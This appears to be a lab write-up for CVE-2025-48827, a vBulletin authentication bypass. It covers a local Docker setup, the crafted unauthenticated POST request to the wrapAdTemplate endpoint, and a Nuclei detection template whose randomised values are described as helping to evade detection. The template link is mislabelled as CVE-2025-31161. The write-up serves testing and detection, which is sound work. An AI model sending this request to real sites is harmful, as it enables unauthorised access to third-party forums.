# CVE-2025-48827: vBulletin - Authentication Bypass

## Description:
vBulletin 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 allows unauthenticated users to invoke protected API controllers' methods when running on PHP 8.1 or later, as demonstrated by the /api.php?method=protectedMethod pattern, as exploited in the wild in May 2025.

## Reference:
- https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce
- https://nvd.nist.gov/vuln/detail/CVE-2025-48827
- https://blog.kevintel.com/vbulletin-replaceadtemplate-kev/

## Vulnerable Setup:

- Unzip html.zip 

- Execute the following commands to start a vBulletin:

```
docker compose up -d
```

- After the server is started and database is restored, browse to http://localhost:8081/ for php 8.1 version.


## Exploitation Steps:

- The authentication bypass can be triggered by sending a crafted POST request to the `/ajax/api/ad/wrapAdTemplate` endpoint with arbitrary values for the `template` and `id_name` parameters (e.g., template=uxdml&id_name=oszde), allowing unauthenticated users to invoke protected ad-related methods in vulnerable vBulletin instances running on PHP 8.1 or later.

<img width="2800" height="976" alt="image" src="https://github.com/user-attachments/assets/30fc1de3-5a96-4510-af01-a80807e8fe6d" />

# Steps to Write Nuclei Template

**Define Variables**

- To evade detection and avoid caching or signature-based blocks, use dynamic values in the request:

```
variables:
  rand_string: "{{to_lower(rand_base(5))}}"
  rand_value: "{{to_lower(rand_text_alpha(5))}}"
```

**Create HTTP Requests**

- The authentication bypass occurs by sending a crafted unauthenticated POST request to the vulnerable endpoint. This allows invocation of protected methods without proper access control on affected vBulletin versions running PHP 8.1.

```yaml
http:
  - raw:
      - |
        POST /ajax/api/ad/wrapAdTemplate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        template={{rand_string}}&id_name={{rand_value}}
```

**Matchers Definition**

- To confirm successful exploitation of the authentication bypass, ensure the response satisfies the following conditions:

  - **Status Code:** The server must return `200 OK`, indicating the request was accepted.

  - **Content-Type:** The response should be in JSON format (`application/json`), suggesting a valid backend response.

  - **Response Body:** The response should include:

      - A reference to the random `id_name` in the form of `ad_{{rand_value}}_inner`

      - The template value injected (`{{rand_string}}`)

      - A partial HTML-like pattern (`<div class=`), indicating dynamic template rendering.

```yaml
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(content_type, 'application/json')
          - contains_all(body,'<div class=','ad_{{rand_value}}_inner','{{rand_string}}')
        condition: and
```

## Nuclei Template URL : [CVE-2025-31161](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-48827.yaml)

## Nuclei Command :

```bash
nuclei -u http://0.0.0.0:8081 -id CVE-2025-48827 -vv
```

<img width="1390" height="566" alt="image" src="https://github.com/user-attachments/assets/deb3ec0c-f6b3-4108-a427-60443c38463a" />
